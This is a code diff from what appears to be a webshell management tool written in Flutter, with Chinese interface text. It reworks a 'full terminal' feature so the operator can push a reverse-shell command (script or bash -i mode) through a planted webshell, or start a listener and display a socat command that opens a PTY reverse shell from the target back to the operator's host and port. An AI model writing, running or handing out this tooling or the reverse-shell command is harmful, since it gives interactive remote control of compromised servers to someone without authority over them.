@@ -532,90 +532,186 @@ class _TerminalTabState extends State<_TerminalTab>
   }
 
   Future<void> _showReverseShellDialog() async {
-    final ipController = TextEditingController(text: '127.0.0.1');
-    final portController = TextEditingController(text: '4444');
-    final ok = await showDialog<bool>(
+    // 选择完整终端方案
+    final mode = await showDialog<String>(
       context: context,
       builder: (context) {
-        return AlertDialog(
-          title: const Text('启动完整终端（反弹 Shell）'),
-          content: Column(
-            mainAxisSize: MainAxisSize.min,
-            children: [
-              TextField(
-                controller: ipController,
-                decoration: const InputDecoration(
-                  labelText: '监听 IP（LHOST）',
-                ),
+        String selected = 'script';
+        return StatefulBuilder(
+          builder: (context, setState) {
+            return AlertDialog(
+              title: const Text('选择完整终端方案'),
+              content: Column(
+                mainAxisSize: MainAxisSize.min,
+                children: [
+                  RadioListTile<String>(
+                    value: 'script',
+                    groupValue: selected,
+                    onChanged: (v) => setState(() => selected = v!),
+                    title: const Text('内置反弹 · script 模式'),
+                    subtitle: const Text(
+                      '优先使用 script 分配伪终端，推荐在类 Unix 目标上使用',
+                      style: TextStyle(fontSize: 11),
+                    ),
+                  ),
+                  RadioListTile<String>(
+                    value: 'bash',
+                    groupValue: selected,
+                    onChanged: (v) => setState(() => selected = v!),
+                    title: const Text('内置反弹 · bash 模式'),
+                    subtitle: const Text(
+                      '不依赖 script，仅使用 bash -i 或 /bin/sh -i 反弹',
+                      style: TextStyle(fontSize: 11),
+                    ),
+                  ),
+                  RadioListTile<String>(
+                    value: 'socat',
+                    groupValue: selected,
+                    onChanged: (v) => setState(() => selected = v!),
+                    title: const Text('socat 反弹（在目标上手动执行命令）'),
+                    subtitle: const Text(
+                      '适合目标已安装 socat，获得更完整的 TTY 体验',
+                      style: TextStyle(fontSize: 11),
+                    ),
+                  ),
+                ],
               ),
-              const SizedBox(height: 12),
-              TextField(
-                controller: portController,
-                decoration: const InputDecoration(
-                  labelText: '监听端口（LPORT）',
+              actions: [
+                TextButton(
+                  onPressed: () => Navigator.of(context).pop(null),
+                  child: const Text('取消'),
                 ),
-                keyboardType: TextInputType.number,
-              ),
-              const SizedBox(height: 8),
-              Text(
-                '提示：请确保目标能够主动连接到该 IP/端口。',
-                style: AppTextStyles.caption(
-                  size: 11,
-                  color: AppColors.textSecondary,
+                FilledButton(
+                  onPressed: () => Navigator.of(context).pop(selected),
+                  child: const Text('确定'),
                 ),
-              ),
-            ],
-          ),
-          actions: [
-            TextButton(
-              onPressed: () => Navigator.of(context).pop(false),
-              child: const Text('取消'),
-            ),
-            FilledButton(
-              onPressed: () => Navigator.of(context).pop(true),
-              child: const Text('确定'),
-            ),
-          ],
+              ],
+            );
+          },
         );
       },
     );
-    if (ok != true) return;
 
-    final lhost = ipController.text.trim();
-    final portStr = portController.text.trim();
-    final lport = int.tryParse(portStr);
-    if (lhost.isEmpty || lport == null) {
-      if (!mounted) return;
-      ScaffoldMessenger.of(context).showSnackBar(
-        const SnackBar(content: Text('监听 IP 或端口不合法')),
-      );
+    if (mode == null) return;
+
+    final rs = ReverseShellService();
+
+    if (mode == 'script' || mode == 'bash') {
+      // 内置反弹：通过当前 Webshell 的连接器发送一次反弹命令
+      // 具体使用 script 还是 bash 由各自连接器的 startReverseShell 实现决定。
+      rs.onSession = (session) {
+        // 为会话打上来源标记，便于在「完整终端」页面展示 Webshell 名称
+        session.label = widget.service.webshell.name;
+        Navigator.of(context).push(
+          MaterialPageRoute(
+            builder: (_) => ReverseShellTerminalPage(session: session),
+          ),
+        );
+      };
+
+      try {
+        await rs.startListening(port: rs.lport);
+        // 只调用一次 startReverseShell，并通过 preferScript 区分 script/bash 方案。
+        await widget.service.startReverseShell(
+          rs.lhost,
+          rs.lport,
+          preferScript: mode == 'script',
+        );
+
+        if (!mounted) return;
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text(
+                '已发送反弹 Shell 命令（模式：${mode == 'script' ? 'script 优先' : 'bash 优先'}），等待连接 ${rs.lhost}:${rs.lport} ...'),
+          ),
+        );
+      } catch (e) {
+        if (!mounted) return;
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text('启动失败：$e'),
+          ),
+        );
+      }
       return;
     }
 
-    final rs = ReverseShellService();
-    rs.onSession = (session) {
-      Navigator.of(context).push(
-        MaterialPageRoute(
-          builder: (_) => ReverseShellTerminalPage(session: session),
-        ),
-      );
-    };
+    if (mode == 'socat') {
+      // socat 模式：仅启动本地监听，并给出在目标上执行的 socat 命令
+      try {
+        await rs.startListening(port: rs.lport);
+      } catch (e) {
+        if (!mounted) return;
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text('启动监听失败：$e'),
+          ),
+        );
+        return;
+      }
 
-    try {
-      await rs.startListening(port: lport);
-      await widget.service.startReverseShell(lhost, lport);
+      // 有新会话时自动打开完整终端
+      rs.onSession = (session) {
+        Navigator.of(context).push(
+          MaterialPageRoute(
+            builder: (_) => ReverseShellTerminalPage(session: session),
+          ),
+        );
+      };
+
+      final cmd = 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:${rs.lhost}:${rs.lport}';
+
       if (!mounted) return;
-      ScaffoldMessenger.of(context).showSnackBar(
-        SnackBar(
-          content: Text('已发送反弹 Shell 命令，等待连接 $lhost:$lport ...'),
-        ),
-      );
-    } catch (e) {
-      if (!mounted) return;
-      ScaffoldMessenger.of(context).showSnackBar(
-        SnackBar(
-          content: Text('启动失败：$e'),
-        ),
+      await showDialog<void>(
+        context: context,
+        builder: (context) {
+          return AlertDialog(
+            title: const Text('socat 反弹命令'),
+            content: Column(
+              mainAxisSize: MainAxisSize.min,
+              crossAxisAlignment: CrossAxisAlignment.start,
+              children: [
+                Text(
+                  '在目标机器上执行以下命令以建立完整 TTY 反弹 Shell：',
+                  style: AppTextStyles.caption(
+                    size: 12,
+                    color: AppColors.textSecondary,
+                  ),
+                ),
+                const SizedBox(height: 8),
+                Container(
+                  padding: const EdgeInsets.all(8),
+                  decoration: BoxDecoration(
+                    color: AppColors.bgDark,
+                    borderRadius: BorderRadius.circular(4),
+                    border: Border.all(color: AppColors.border),
+                  ),
+                  child: SelectableText(
+                    cmd,
+                    style: AppTextStyles.terminal(
+                      size: 12,
+                      color: AppColors.cyan,
+                    ),
+                  ),
+                ),
+                const SizedBox(height: 8),
+                Text(
+                  '提示：\n1. 本机已在 :${rs.lport} 端口监听。\n2. 目标执行成功后，这里会自动弹出完整终端窗口。',
+                  style: AppTextStyles.caption(
+                    size: 11,
+                    color: AppColors.textMuted,
+                  ),
+                ),
+              ],
+            ),
+            actions: [
+              TextButton(
+                onPressed: () => Navigator.of(context).pop(),
+                child: const Text('关闭'),
+              ),
+            ],
+          );
+        },
       );
     }
   }
